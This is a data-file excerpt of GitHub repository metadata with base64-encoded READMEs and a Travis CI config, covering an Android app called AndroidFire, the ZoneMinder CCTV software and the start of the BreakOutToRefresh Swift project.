77ya5YyF5ZCr5LiH6IO96YCC6YWN5Zmo44CBcmVjeWNsZXJ2aWV355qE5LiL
5ouJ5Yi35paw5LiK5ouJ5Yqg6L295pu05aSa44CB6Ieq5a6a5LmJ5Yi35paw
5aS05ZKM5Yqg6L295pu05aSa5aS077ybc2VsZWN0b3JkaWFsb2fvvJrnu4/l
uLjkvb/nlKjliLDnmoTlh6Dnp41EaWFsb2fvvJtvbmVLZXlTaGFyZVNES++8
muekvuS6pOWIhuS6q++8m+W+ruS/oeWSjOaUr+S7mOWuneWwgeijheetieet
iQotIOaXoOWFs+S4muWKoeWGheWuueWwgeijheaIkG1vZGVs77yM5Z+65LqO
5q2k5qGG5p625Y+v5Lul5b+r6YCf5byA5Y+R5LiA5LiqYXBwCgojIyMjIOeU
qOWIsOeahOW8gOa6kOW6k+acie+8mgotIG9tLmZseWNvLnRhYmxheW91dDpG
bHljb1RhYkxheW91dF9MaWI6Mi4wLjhAYWFyIAotIGNvbS5naXRodWIuY2xh
bnM6ZmFiOjEuNi40Ci0gY29tLnNxdWFyZXVwLnJldHJvZml0MjpyZXRyb2Zp
dDoyLjAuMC1iZXRhMwotIGlvLnJlYWN0aXZleDpyeGphdmE6MS4wLjEKLSBp
by5yZWFjdGl2ZXg6cnhhbmRyb2lkOjEuMC4xCi0gY29tLmdpdGh1Yi5idW1w
dGVjaC5nbGlkZTpnbGlkZTozLjYuMQotIGZtLmppZWNhbzpqaWVjYW92aWRl
b3BsYXllcjo0LjcuMCAKLSBjbi5odWdldGVycnkudXBkYXRlZnVuOnVwZGF0
ZWZ1bjoxLjguNuetieetiQoKPuacrOS6uuS8muWdmuaMgeWcqOi/meS4qumh
ueebruS4iuWunui3teacgOaWsOeahOaKgOacr++8jOS5n+S8muS6ieWPluaL
k+WxleabtOWkmueahOmYheivu+WGheWuue+8jOasoui/juWQhOS9jeWFs+az
qO+8gQrms6jmhI/vvJrmnKzpobnnm67ov5jlnKjmtYvor5XpmLbmrrXvvIzl
j5HnjrAgYnVnIOaIluacieWlveeahOW7uuiuruasoui/jmlzc3Vl44CBZW1h
aWwoamF5ZGVueGlhbzIwMTZAZ21haWwuY29tKSzlpoLmnpzmhJ/op4nlr7nk
vaDmnInluK7liqnkuZ/mrKLov47ngrnkuKogc3RhcuOAgWZvcmvvvIzmnKzp
obnnm67ku4XlgZrlrabkuaDkuqTmtYHkvb/nlKjvvIxBUEkg5pWw5o2u5YaF
5a655omA5pyJ5p2D5b2S5Y6f5L2c5YWs5Y+45omA5pyJ77yM6K+35Yu/55So
5LqO5YW25LuW55So6YCUCgrmnIDlkI7pmYTkuIrkuIvovb3lnLDlnYDlkozm
upDnoIEKW2dpdGh1Yua6kOeggV0oaHR0cHM6Ly9naXRodWIuY29tL2pheWRl
bnhpYW8yMDE2L0FuZHJvaWRGaXJlKQpb5a6J6KOF5Zyw5Z2AXShodHRwOi8v
ZmlyLmltL2FuZHJvaWRGaXJlKQoK5pu05aSa57K+5b2p5paH56ug6K+35YWz
5rOo5b6u5L+h5YWs5LyX5Y+3IioqQW5kcm9pZOe7j+mqjOWIhuS6qyoqIu+8
mui/memHjOWwhumVv+acn+S4uuaCqOWIhuS6q0FuZHJvaWTpq5jmiYvnu4/p
qozjgIHkuK3lpJblvIDmupDpobnnm67jgIHmupDnoIHop6PmnpDjgIHmoYbm
nrborr7orqHlkoxBbmRyb2lk5aW95paH5o6o6I2Q77yBCgohW+aJq+S4gOaJ
q+WKoOaIkeWTpl0oaHR0cDovL3VwbG9hZC1pbWFnZXMuamlhbnNodS5pby91
cGxvYWRfaW1hZ2VzLzE5NjQwOTYtNmIwNGQyZTdjZmY2ZDdjNy5qcGc/aW1h
Z2VNb2dyMi9hdXRvLW9yaWVudC9zdHJpcCU3Q2ltYWdlVmlldzIvMi93LzEy
NDApCg==
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'zoneminder',9395939,"b'ZoneMinder is a free, open source Closed-circuit television software application developed for Linux which supports IP, USB and Analog cameras. '",b'PHP',53,2390,,2390,False,b'https://api.github.com/repos/ZoneMinder/zoneminder/forks',"Wm9uZU1pbmRlcgo9PT09PT09PT09CgpbIVtCdWlsZCBTdGF0dXNdKGh0dHBz
Oi8vdHJhdmlzLWNpLm9yZy9ab25lTWluZGVyL3pvbmVtaW5kZXIucG5nKV0o
aHR0cHM6Ly90cmF2aXMtY2kub3JnL1pvbmVNaW5kZXIvem9uZW1pbmRlcikg
WyFbQm91bnR5c291cmNlXShodHRwczovL2FwaS5ib3VudHlzb3VyY2UuY29t
L2JhZGdlL3RlYW0/dGVhbV9pZD0yMDQmc3R5bGU9Ym91bnRpZXNfcmVjZWl2
ZWQpXShodHRwczovL3d3dy5ib3VudHlzb3VyY2UuY29tL3RlYW1zL3pvbmVt
aW5kZXIvaXNzdWVzP3V0bV9zb3VyY2U9Wm9uZU1pbmRlciZ1dG1fbWVkaXVt
PXNoaWVsZCZ1dG1fY2FtcGFpZ249Ym91bnRpZXNfcmVjZWl2ZWQpCgpbIVtK
b2luIFNsYWNrXShodHRwczovL2dpdGh1Yi5jb20vb3pvbmVzZWN1cml0eS9v
em9uZWJhc2UvYmxvYi9tYXN0ZXIvaW1nL3NsYWNrc20ucG5nP3Jhdz10cnVl
KV0oaHR0cHM6Ly9qb2luLnNsYWNrLmNvbS90L3pvbmVtaW5kZXItY2hhdC9z
aGFyZWRfaW52aXRlL2VuUXROVFUwTkRreE1ETTVORFF3TFRkaFptUTVZMk0y
TldReU4ySmtZVEJpTjJaa016SXpaR1EwTURsaU1UUm1NMkZqWldSbFl6VXdZ
VFEyTWpNd01UVmpNelExTmpZeE9UZG1NakUyTVRFKQoKQWxsIGRvY3VtZW50
YXRpb24gZm9yIFpvbmVNaW5kZXIgaXMgbm93IG9ubGluZSBhdCBodHRwczov
L3pvbmVtaW5kZXIucmVhZHRoZWRvY3Mub3JnCgojIyBPdmVydmlldwoKWm9u
ZU1pbmRlciBpcyBhbiBpbnRlZ3JhdGVkIHNldCBvZiBhcHBsaWNhdGlvbnMg
d2hpY2ggcHJvdmlkZSBhIGNvbXBsZXRlIHN1cnZlaWxsYW5jZSBzb2x1dGlv
biBhbGxvd2luZyBjYXB0dXJlLCBhbmFseXNpcywgcmVjb3JkaW5nIGFuZCBt
b25pdG9yaW5nIG9mIGFueSBDQ1RWIG9yIHNlY3VyaXR5IGNhbWVyYXMgYXR0
YWNoZWQgdG8gYSBMaW51eCBiYXNlZCBtYWNoaW5lLiBJdCBpcyBkZXNpZ25l
ZCB0byBydW4gb24gZGlzdHJpYnV0aW9ucyB3aGljaCBzdXBwb3J0IHRoZSBW
aWRlbyBGb3IgTGludXggKFY0TCkgaW50ZXJmYWNlIGFuZCBoYXMgYmVlbiB0
ZXN0ZWQgd2l0aCB2aWRlbyBjYW1lcmFzIGF0dGFjaGVkIHRvIEJUVFYgY2Fy
ZHMsIHZhcmlvdXMgVVNCIGNhbWVyYXMgYW5kIGFsc28gc3VwcG9ydHMgbW9z
dCBJUCBuZXR3b3JrIGNhbWVyYXMuIAoKIyMgQ29udGFjdGluZyB0aGUgRGV2
ZWxvcG1lbnQgVGVhbQpCZWZvcmUgY3JlYXRpbmcgYW4gaXNzdWUgaW4gb3Vy
IGdpdGh1YiBmb3J1bSwgcGxlYXNlIHJlYWQgb3VyIHBvc3RpbmcgcnVsZXM6
Cmh0dHBzOi8vZ2l0aHViLmNvbS9ab25lTWluZGVyL1pvbmVNaW5kZXIvd2lr
aS9HaXRodWItUG9zdGluZy1SdWxlcwoKIyMgT3VyIERvY2tlcmZpbGUgaGFz
IG1vdmVkClBsZWFzZSBmaWxlIGlzc3VlcyBhZ2FpbnN0IHRoZSBab25lTWlu
ZGVyIERvY2tlcmZpbGUgaGVyZTogCmh0dHBzOi8vZ2l0aHViLmNvbS9ab25l
TWluZGVyL3ptZG9ja2VyZmlsZXMKCiMjIEluc3RhbGxhdGlvbiBNZXRob2Rz
CgojIyMgQnVpbGRpbmcgZnJvbSBTb3VyY2UgaXMgRGlzY291cmFnZWQKCkhp
c3RvcmljYWxseSwgaW5zdGFsbGluZyBab25lTWluZGVyIG9udG8geW91ciBz
eXN0ZW0gcmVxdWlyZWQgYnVpbGRpbmcgZnJvbSBzb3VyY2UgY29kZSBieSBp
c3N1aW5nIHRoZSB0cmFkaXRpb25hbCBjb25maWd1cmUsIG1ha2UsIG1ha2Ug
aW5zdGFsbCBjb21tYW5kcy4gIFRvIGdldCBab25lTWluZGVyIHRvIGJ1aWxk
LCBhbGwgb2YgaXRzIGRlcGVuZGVuY2llcyBoYWQgdG8gYmUgZGV0ZXJtaW5l
ZCBhbmQgaW5zdGFsbGVkIGJlZm9yZWhhbmQuIEluaXQgYW5kIGxvZ3JvdGF0
ZSBzY3JpcHRzIGhhZCB0byBiZSBtYW51YWxseSBjb3BpZWQgaW50byBwbGFj
ZSBmb2xsb3dpbmcgdGhlIGJ1aWxkLiAgT3B0aW9uYWwgcGFja2FnZXMgc3Vj
aCBhcyBqc2NhbGVuZGFyIGFuZCBDYW1ib3pvbGEgaGFkIHRvIGJlIG1hbnVh
bGx5IGluc3RhbGxlZC4gVW5pbnN0YWxscyBjb3VsZCBsZWF2ZSBzdGFsZSBm
aWxlcyBhcm91bmQsIHdoaWNoIGNvdWxkIGNhdXNlIHByb2JsZW1zIGR1cmlu
ZyBhbiB1cGdyYWRlLiAgU3BlYWtpbmcgb2YgdXBncmFkZXMsIHdoZW4gaXQg
Y29tZXMgdGltZSB0byB1cGdyYWRlIGFsbCB0aGVzZSBtYW51YWwgc3RlcHMg
bXVzdCBiZSByZXBlYXRlZCBhZ2Fpbi4KCkJldHRlciBtZXRob2RzIGV4aXN0
IHRvZGF5IHRoYXQgZG8gbXVjaCBvZiB0aGlzIGZvciB5b3UuIFRoZSBjdXJy
ZW50IGRldmVsb3BtZW50IHRlYW0sIGFsb25nIHdpdGggb3RoZXIgdm9sdW50
ZWVycywgaGF2ZSB0YWtlbiBncmVhdCBzdHJpZGVzIGluIHByb3ZpZGluZyB0
aGUgcmVzb3VyY2VzIG5lY2Vzc2FyeSB0byBhdm9pZCBidWlsZGluZyBmcm9t
IHNvdXJjZS4gIAoKIyMjIEluc3RhbGwgZnJvbSBhIFBhY2thZ2UgUmVwb3Np
dG9yeQoKVGhpcyBpcyB0aGUgcmVjb21tZW5kZWQgbWV0aG9kIHRvIGluc3Rh
bGwgWm9uZU1pbmRlciBvbnRvIHlvdXIgc3lzdGVtLiBab25lTWluZGVyIHBh
Y2thZ2VzIGFyZSBtYWludGFpbmVkIGZvciB0aGUgZm9sbG93aW5nIGRpc3Ry
b3M6CgotIFVidW50dSB2aWEgW0ljb25ub3IncyBQUEFdKGh0dHBzOi8vbGF1
bmNocGFkLm5ldC9+aWNvbm5vcikKLSBEZWJpYW4gZnJvbSB0aGVpciBbZGVm
YXVsdCByZXBvc2l0b3J5XShodHRwczovL3BhY2thZ2VzLmRlYmlhbi5vcmcv
c2VhcmNoP3NlYXJjaG9uPW5hbWVzJmtleXdvcmRzPXpvbmVtaW5kZXIpIAot
IFJIRUwvQ2VudE9TIGFuZCBjbG9uZXMgdmlhIFtSUE0gRnVzaW9uXShodHRw
Oi8vcnBtZnVzaW9uLm9yZykKLSBGZWRvcmEgdmlhIFtSUE0gRnVzaW9uXSho
dHRwOi8vcnBtZnVzaW9uLm9yZykKLSBPcGVuU3VzZSB2aWEgW3RoaXJkIHBh
cnR5IHJlcG9zaXRvcnldKGh0dHA6Ly93d3cuem9uZW1pbmRlci5jb20vd2lr
aS9pbmRleC5waHAvSW5zdGFsbGluZ191c2luZ19ab25lTWluZGVyX1JQTXNf
Zm9yX1N1U0UpCi0gTWFnZWlhIGZyb20gdGhlaXIgZGVmYXVsdCByZXBvc2l0
b3J5Ci0gQXJjaCB2aWEgdGhlIFtBVVJdKGh0dHBzOi8vYXVyLmFyY2hsaW51
eC5vcmcvcGFja2FnZXMvem9uZW1pbmRlci8pCi0gR2VudG9vIGZyb20gdGhl
aXIgW2RlZmF1bHQgcmVwb3NpdG9yeV0oaHR0cHM6Ly9wYWNrYWdlcy5nZW50
b28ub3JnL3BhY2thZ2VzL3d3dy1taXNjL3pvbmVtaW5kZXIpCgpJZiBhIHJl
cG9zaXRvcnkgdGhhdCBob3N0cyBab25lTWluZGVyIHBhY2thZ2VzIGlzIG5v
dCBhdmFpbGFibGUgZm9yIHlvdXIgZGlzdHJvLCB0aGVuIHlvdSBhcmUgZW5j
b3VyYWdlZCB0byBidWlsZCB5b3VyIG93biBwYWNrYWdlLCByYXRoZXIgdGhh
biBidWlsZCBmcm9tIHNvdXJjZS4gIFdoaWxlIGVhY2ggZGlzdHJvIGlzIGRp
ZmZlcmVudCBpbiB3YXlzIHRoYXQgc2V0IGl0IGFwYXJ0IGZyb20gYWxsIHRo
ZSBvdGhlcnMsIHRoZXkgYXJlIG9mdGVuIHNpbWlsYXIgZW5vdWdoIHRvIGFs
bG93IHlvdSB0byBhZGFwdCBhbm90aGVyIGRpc3RybydzIHBhY2thZ2UgYnVp
bGRpbmcgaW5zdHJ1Y3Rpb25zIHRvIHlvdXIgb3duLgoKIyMjIEJ1aWxkaW5n
IGEgWm9uZU1pbmRlciBQYWNrYWdlICMjIwoKQnVpbGRpbmcgWm9uZU1pbmRl
ciBpbnRvIGEgcGFja2FnZSBpcyBub3QgYW55IGhhcmRlciB0aGFuIGJ1aWxk
aW5nIGZyb20gc291cmNlLiAgQXMgYSBtYXR0ZXIgb2YgZmFjdCwgaWYgeW91
IGhhdmUgc3VjY2Vzc2Z1bGx5IGJ1aWx0IFpvbmVNaW5kZXIgZnJvbSBzb3Vy
Y2UgaW4gdGhlIHBhc3QsIHRoZW4geW91IG1heSBmaW5kIHRoZXNlIHN0ZXBz
IHRvIGJlIGVhc2llci4gCgpXaGVuIGJ1aWxkaW5nIGEgcGFja2FnZSwgaXQg
aXMgYmVzdCB0byBkbyB0aGlzIHdvcmsgaW4gYSBzZXBhcmF0ZSBlbnZpcm9u
bWVudCwgZGVkaWNhdGVkIHRvIGRldmVsb3BtZW50IHB1cnBvc2VzLiBUaGlz
IGNvdWxkIGJlIGFzIHNpbXBsZSBhcyBjcmVhdGluZyBhIHZpcnR1YWwgbWFj
aGluZSwgdXNpbmcgRG9ja2VyLCBvciB1c2luZyBtb2NrLiAgQWxsIGl0IHRh
a2VzIGlzIG9uZSDigJxPb3Bz4oCdIHRvIHJlZ3JldCBkb2luZyB0aGlzIHdv
cmsgb24geW91ciBwcm9kdWN0aW9uIHNlcnZlci4KCkxhc3RseSwgaWYgeW91
IGRlc2lyZSB0byBidWlsZCBhIGRldmVsb3BtZW50IHNuYXBzaG90IGZyb20g
dGhlIG1hc3RlciBicmFuY2gsIGl0IGlzIHJlY29tbWVuZGVkIHlvdSBmaXJz
dCBidWlsZCB5b3VyIHBhY2thZ2UgdXNpbmcgYW4gb2ZmaWNpYWwgcmVsZWFz
ZSBvZiBab25lTWluZGVyLiBUaGlzIHdpbGwgaGVscCBpZGVudGlmeSB3aGV0
aGVyIGFueSBwcm9ibGVtcyB5b3UgbWF5IGVuY291bnRlciBhcmUgY2F1c2Vk
IGJ5IHRoZSBidWlsZCBwcm9jZXNzIG9yIGlzIGEgbmV3IGlzc3VlIGluIHRo
ZSBtYXN0ZXIgYnJhbmNoLgoKUGxlYXNlIHZpc2l0IG91ciBbUmVhZHRoZURv
Y3Mgc2l0ZV0oaHR0cHM6Ly96b25lbWluZGVyLnJlYWR0aGVkb2NzLm9yZy9l
bi9zdGFibGUvaW5zdGFsbGF0aW9uZ3VpZGUvaW5kZXguaHRtbCkgZm9yIGRp
c3RybyBzcGVjaWZpYyBpbnN0cnVjdGlvbnMuCgojIyMgUGFja2FnZSBNYWlu
dGFpbmVycwpNYW55IG9mIHRoZSBab25lTWluZGVyIGNvbmZpZ3VyYXRpb24g
dmFyaWFibGUgZGVmYXVsdCB2YWx1ZXMgYXJlIG5vdCBjb25maWd1cmFibGUg
YXQgYnVpbGQgdGltZSB0aHJvdWdoIGF1dG90b29scyBvciBjbWFrZS4gIEEg
bmV3IHRvb2wgY2FsbGVkICp6bWVkaXRjb25maWdkYXRhLnNoKiBoYXMgYmVl
biBhZGRlZCB0byBhbGxvdyBwYWNrYWdlIG1haW50YWluZXJzIHRvIG1hbmlw
dWxhdGUgYW55IHZhcmlhYmxlIHN0b3JlZCBpbiBDb25maWdEYXRhLnBtIHdp
dGhvdXQgcGF0Y2hpbmcgdGhlIHNvdXJjZS4gCgpGb3IgZXhhbXBsZSwgbGV0
J3Mgc2F5IEkgaGF2ZSBjcmVhdGVkIGEgbmV3IFpvbmVNaW5kZXIgcGFja2Fn
ZSB0aGF0IGNvbnRhaW5zIHRoZSBjYW1ib3pvbGEgamF2YXNjcmlwdCBmaWxl
LiAgSG93ZXZlciwgYnkgZGVmYXVsdCBjYW1ib3pvbGEgc3VwcG9ydCBpcyB0
dXJuZWQgb2ZmLiAgVG8gZml4IHRoYXQsIGFkZCB0aGlzIHRvIHRoZSBwYWNr
YWdpbmcgc2NyaXB0OgpgYGBiYXNoCi4vdXRpbHMvem1lZGl0Y29uZmlnZGF0
YS5zaCBaTV9PUFRfQ0FNQk9aT0xBIHllcwpgYGAKCk5vdGUgdGhhdCB6bWVk
aXRjb25maWdkYXRhLnNoIGlzIGludGVuZGVkIHRvIGJlIGNhbGxlZCwgZnJv
bSB0aGUgcm9vdCBidWlsZCBmb2xkZXIsIHByaW9yIHRvIHJ1bm5pbmcgY21h
a2Ugb3IgY29uZmlndXJlLgoKIyMjIyBEb2NrZXIKCkRvY2tlciBpcyBhIHN5
c3RlbSB0byBydW4gYXBwbGljYXRpb25zIGluc2lkZSBpc29sYXRlZCBjb250
YWluZXJzLiBab25lTWluZGVyLCBhbmQgdGhlIFpNIHdlYnNlcnZlciwgd2ls
bCBydW4gdXNpbmcgdGhlIApEb2NrZXJmaWxlIGNvbnRhaW5lZCBpbiB0aGlz
IHJlcG9zaXRvcnkuIEhvd2V2ZXIsIHRoZXJlIGlzIHN0aWxsIHdvcmsgbmVl
ZGVkIHRvIGVuc3VyZSB0aGF0IHRoZSBtYWluIFpNIGZlYXR1cmVzIHdvcmsg
CnByb3Blcmx5IGFuZCBhcmUgZG9jdW1lbnRlZC4gCgojIyBDb250cmlidXRp
b24gTW9kZWwgYW5kICBEZXZlbG9wbWVudAoKKiBTb3VyY2UgaG9zdGVkIGF0
IFtHaXRIdWJdKGh0dHBzOi8vZ2l0aHViLmNvbS9ab25lTWluZGVyL1pvbmVN
aW5kZXIvKQoqIFJlcG9ydCBpc3N1ZXMvcXVlc3Rpb25zL2ZlYXR1cmUgcmVx
dWVzdHMgb24gW0dpdEh1YiBJc3N1ZXNdKGh0dHBzOi8vZ2l0aHViLmNvbS9a
b25lTWluZGVyL1pvbmVNaW5kZXIvaXNzdWVzKQoKUHVsbCByZXF1ZXN0cyBh
cmUgdmVyeSB3ZWxjb21lISAgSWYgeW91IHdvdWxkIGxpa2UgdG8gY29udHJp
YnV0ZSwgcGxlYXNlIGZvbGxvdwp0aGUgZm9sbG93aW5nIHN0ZXBzLgoKMS4g
Rm9yayB0aGUgcmVwbwoyLiBPcGVuIGFuIGlzc3VlIGF0IG91ciBbR2l0SHVi
IElzc3VlcyBUcmFja2VyXShodHRwczovL2dpdGh1Yi5jb20vWm9uZU1pbmRl
ci9ab25lTWluZGVyL2lzc3VlcykuCiAgIERlc2NyaWJlIHRoZSBidWcgdGhh
dCB5b3UndmUgZm91bmQsIG9yIHRoZSBmZWF0dXJlIHdoaWNoIHlvdSdyZSBh
c2tpbmcgZm9yLgogICBKb3QgZG93biB0aGUgaXNzdWUgbnVtYmVyIChlLmcu
IDQ1NikKMy4gQ3JlYXRlIHlvdXIgZmVhdHVyZSBicmFuY2ggKGBnaXQgY2hl
Y2tvdXQgLWIgNDU2LW15LW5ldy1mZWF0dXJlYCkKNC4gQ29tbWl0IHlvdXIg
Y2hhbmdlcyAoYGdpdCBjb21taXQgLWFtICdBZGRlZCBzb21lIGZlYXR1cmUn
YCkKICAgSXQgaXMgcHJlZmVycmVkIHRoYXQgeW91ICdjb21taXQgZWFybHkg
YW5kIG9mdGVuJyBpbnN0ZWFkIG9mIGJ1bmNoaW5nIGFsbAogICBjaGFuZ2Vz
IGludG8gYSBzaW5nbGUgY29tbWl0Lgo1LiBQdXNoIHlvdXIgYnJhbmNoIHRv
IHlvdXIgZm9yayBvbiBnaXRodWIgKGBnaXQgcHVzaCBvcmlnaW4gNDU2LW15
LW5ldy1mZWF0dXJlYCkKNi4gQ3JlYXRlIG5ldyBQdWxsIFJlcXVlc3QKNy4g
VGhlIHRlYW0gd2lsbCB0aGVuIHJldmlldywgZGlzY3VzcyBhbmQgaG9wZWZ1
bGx5IG1lcmdlIHlvdXIgY2hhbmdlcy4KClshW0FuYWx5dGljc10oaHR0cHM6
Ly9nYS1iZWFjb24uYXBwc3BvdC5jb20vVUEtMTUxNDcyNzMtNi9ab25lTWlu
ZGVyL1JFQURNRS5tZCldKGh0dHBzOi8vZ2l0aHViLmNvbS9pZ3JpZ29yaWsv
Z2EtYmVhY29uKQo=
",,"bGFuZ3VhZ2U6IGNwcApzdWRvOiByZXF1aXJlZApkaXN0OiB4ZW5pYWwKZ2l0
OgogIGRlcHRoOiA5OTk5OTk5Cm5vdGlmaWNhdGlvbnM6CiAgaXJjOiBjaGF0
LmZyZWVub2RlLm5ldCN6b25lbWluZGVyLWRldgpicmFuY2hlczoKICBleGNl
cHQ6CiAgLSBtb2Rlcm4KY2FjaGU6IGNjYWNoZQphZGRvbnM6CiAgYXB0Ogog
ICAgc291cmNlczoKICAgIC0gc291cmNlbGluZTogcHBhOmljb25ub3Ivem9u
ZW1pbmRlcgogICAgLSBrZXlfdXJsOiBodHRwOi8va2V5c2VydmVyLnVidW50
dS5jb206MTEzNzEvcGtzL2xvb2t1cD9vcD1nZXQmc2VhcmNoPTB4NEQwQkY3
NDg3NzZGRkIwNAogICAgcGFja2FnZXM6CiAgICAtIGdkZWJpCiAgICAtIHl1
bS11dGlscwogICAgLSBwYXRjaAogICAgLSBnaXQKICAgIC0gY3VybAogICAg
LSBzc2hmcwogICAgLSBzZWQKICAgIC0gYmluZm10LXN1cHBvcnQKICAgIC0g
cWVtdQogICAgLSBxZW11LXVzZXItc3RhdGljCiAgICAtIGRuc3V0aWxzCiAg
ICAtIHRyYWNlcm91dGUKaW5zdGFsbDoKICAtIGVjaG8gJ2VjZHNhLXNoYTIt
bmlzdHAyNTYgQUFBQUUyVmpaSE5oTFhOb1lUSXRibWx6ZEhBeU5UWUFBQUFJ
Ym1semRIQXlOVFlBQUFCQkJQMThZQVRZVVdORml3ZnNWTVRoZ3pLUkxyVG4y
K3ZGREFNdmwwaHovTzBDMXB4ZmRPRHFyZXZHRDVia09OTnpSYStPbHErWmJF
WjBaWWl5YkZ6YmdXZz0gem9uZW1pbmRlci5jb20nID4+ICRIT01FLy5zc2gv
a25vd25faG9zdHMKICAtIHVwZGF0ZS1iaW5mbXRzIC0tZW5hYmxlIHFlbXUt
YXJtCgplbnY6CiAgLSBTTVBGTEFHUz0tajQgT1M9ZWwgRElTVD03CiAgLSBT
TVBGTEFHUz0tajQgT1M9ZWwgRElTVD04CiAgLSBTTVBGTEFHUz0tajQgT1M9
ZmVkb3JhIERJU1Q9MjggRE9DS0VSX1JFUE89a25ubmlnZ2V0dC9wYWNrcGFj
awogIC0gU01QRkxBR1M9LWo0IE9TPWZlZG9yYSBESVNUPTI5IERPQ0tFUl9S
RVBPPWtubm5pZ2dldHQvcGFja3BhY2sKICAtIFNNUEZMQUdTPS1qNCBPUz1m
ZWRvcmEgRElTVD0zMAogIC0gU01QRkxBR1M9LWo0IE9TPXVidW50dSBESVNU
PXRydXN0eSBET0NLRVJfUkVQTz1pY29uem0vcGFja3BhY2sgVVNFX1NGVFA9
eWVzCiAgLSBTTVBGTEFHUz0tajQgT1M9dWJ1bnR1IERJU1Q9eGVuaWFsIERP
Q0tFUl9SRVBPPWljb256bS9wYWNrcGFjayBVU0VfU0ZUUD15ZXMKICAtIFNN
UEZMQUdTPS1qNCBPUz11YnVudHUgRElTVD1iaW9uaWMgRE9DS0VSX1JFUE89
aWNvbnptL3BhY2twYWNrIFVTRV9TRlRQPXllcwogIC0gU01QRkxBR1M9LWo0
IE9TPXVidW50dSBESVNUPWRpc2NvIERPQ0tFUl9SRVBPPWljb256bS9wYWNr
cGFjayBVU0VfU0ZUUD15ZXMKICAtIFNNUEZMQUdTPS1qNCBPUz11YnVudHUg
RElTVD1lb2FuIERPQ0tFUl9SRVBPPWljb256bS9wYWNrcGFjayBVU0VfU0ZU
UD15ZXMKICAtIFNNUEZMQUdTPS1qNCBPUz1kZWJpYW4gRElTVD1qZXNzaWUg
RE9DS0VSX1JFUE89aWNvbnptL3BhY2twYWNrIFVTRV9TRlRQPXllcwogIC0g
U01QRkxBR1M9LWo0IE9TPWRlYmlhbiBESVNUPXN0cmV0Y2ggRE9DS0VSX1JF
UE89aWNvbnptL3BhY2twYWNrIFVTRV9TRlRQPXllcwogIC0gU01QRkxBR1M9
LWo0IE9TPWRlYmlhbiBESVNUPWJ1c3RlciBET0NLRVJfUkVQTz1pY29uem0v
cGFja3BhY2sgVVNFX1NGVFA9eWVzCiAgLSBTTVBGTEFHUz0tajQgT1M9dWJ1
bnR1IERJU1Q9dHJ1c3R5IEFSQ0g9aTM4NgogIC0gU01QRkxBR1M9LWo0IE9T
PXVidW50dSBESVNUPXhlbmlhbCBBUkNIPWkzODYKICAtIFNNUEZMQUdTPS1q
NCBPUz11YnVudHUgRElTVD1iaW9uaWMgQVJDSD1pMzg2CiAgLSBTTVBGTEFH
Uz0tajQgT1M9dWJ1bnR1IERJU1Q9ZGlzY28gQVJDSD1pMzg2CiAgLSBTTVBG
TEFHUz0tajQgT1M9ZGViaWFuIERJU1Q9YnVzdGVyIEFSQ0g9aTM4NgogIC0g
U01QRkxBR1M9LWo0IE9TPWRlYmlhbiBESVNUPXN0cmV0Y2ggQVJDSD1pMzg2
CiAgLSBTTVBGTEFHUz0tajQgT1M9cmFzcGJpYW4gRElTVD1zdHJldGNoIEFS
Q0g9YXJtaGYgRE9DS0VSX1JFUE89a25ubmlnZ2V0dC9wYWNrcGFjawoKY29t
cGlsZXI6Ci0gZ2NjCnNlcnZpY2VzOgotIG15c3FsCi0gZG9ja2VyCgpqb2Jz
OgogIGluY2x1ZGU6CiAgICAtIG5hbWU6IGVzbGludAogICAgICBpbnN0YWxs
OiBucG0gaW5zdGFsbCAtZyBlc2xpbnRANS4xMi4wIGVzbGludC1jb25maWct
Z29vZ2xlQDAuMTEuMCBlc2xpbnQtcGx1Z2luLWh0bWxANS4wLjAgZXNsaW50
LXBsdWdpbi1waHAtbWFya3VwQDAuMi41CiAgICAgIHNjcmlwdDogZXNsaW50
IC0tZXh0IC5waHAsLmpzIC4KCnNjcmlwdDoKLSB1dGlscy9wYWNrcGFjay9z
dGFydHBhY2twYWNrLnNoCgpiZWZvcmVfZGVwbG95OgotIG9wZW5zc2wgYWVz
LTI1Ni1jYmMgLUsgJGVuY3J5cHRlZF82MmE2Mjc1MGFhNzNfa2V5IC1pdiAk
ZW5jcnlwdGVkXzYyYTYyNzUwYWE3M19pdiAtaW4gLi91dGlscy9wYWNrcGFj
ay9kZXBsb3lfcnNhLmVuYyAtb3V0IC90bXAvZGVwbG95X3JzYSAtZAotIGV2
YWwgIiQoc3NoLWFnZW50IC1zKSIKLSBjaG1vZCA2MDAgL3RtcC9kZXBsb3lf
cnNhCi0gc3NoLWFkZCAvdG1wL2RlcGxveV9yc2EKCmRlcGxveToKICBwcm92
aWRlcjogc2NyaXB0CiAgc2tpcF9jbGVhbnVwOiB0cnVlCiAgc2NyaXB0OiB1
dGlscy9wYWNrcGFjay9yc3luY194ZmVyLnNoCiAgb246CiAgICBicmFuY2g6
IG1hc3Rlcgo=
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'BreakOutToRefresh',29458939,b'Play BreakOut while loading - A playable pull to refresh view using SpriteKit',b'Swift',2,2389,,2389,False,b'https://api.github.com/repos/dasdom/BreakOutToRefresh/forks',"IyBCcmVha091dFRvUmVmcmVzaApQbGF5IEJyZWFrT3V0IHdoaWxlIGxvYWRp
bmcgLSBBIHBsYXlhYmxlIHB1bGwgdG8gcmVmcmVzaCB2aWV3IHVzaW5nIFNw
cml0ZUtpdAoKIVtdKGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNv
bS9kYXNkb20vQnJlYWtPdXRUb1JlZnJlc2gvbWFzdGVyL0V4YW1wbGUvUHVs
bFRvUmVmcmVzaERlbW8vd2hhdC5naWYpCgpCcmVha091dFRvUmVmcmVzaCB1
c2VzIFNwcml0ZUtpdCB0byBhZGQgYSBwbGF5YWJsZSBtaW5pIGdhbWUgdG8g
